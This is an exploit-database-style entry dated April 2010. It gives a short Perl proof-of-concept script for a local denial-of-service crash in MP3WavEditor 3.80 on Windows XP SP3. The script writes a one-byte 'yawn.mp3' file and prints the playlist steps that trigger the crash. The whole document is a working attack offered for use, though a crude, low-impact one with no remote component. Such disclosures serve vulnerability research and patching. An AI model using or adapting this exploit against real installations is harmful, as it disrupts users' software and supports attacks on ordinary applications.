# Exploit Title: MP3WavEditor Local DoS .mp3
# Date: April 5, 2010
# Software Link: [http://www.mp3waveditor.com/index.htm]
# Version: 3.80
# Tested on: Windows XP SP3
# Author: [anonymous]
#
#
#!/usr/bin/perl

my $file = "yawn.mp3";
my $_a = "\x41";

open (FILE, ">$file");
print FILE "$_a";

print "Usage: Make playlist -> Add mp3 -> Delete Playlist -> Recreate same playlist\n";